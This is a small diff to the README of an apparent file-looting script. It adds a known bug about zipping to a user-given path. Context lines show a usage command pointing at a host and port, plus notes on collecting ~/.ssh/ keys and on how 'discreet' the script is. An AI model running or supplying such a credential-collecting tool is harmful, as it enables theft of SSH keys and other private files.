@@ -53,6 +53,7 @@ python ./looter.py -a -t 10.0.0.1 -p 1234 -d ~/Desktop/
 ```
 
 ##Known Issues
+* Random bug where user specified path sometimes causes zipping to fail
 * Clean up collection of ~/.ssh/ file (currently throws everything into single folder with everything else)
 * Not sure how "discreet" the script is yet, plenty of room for improvement
 
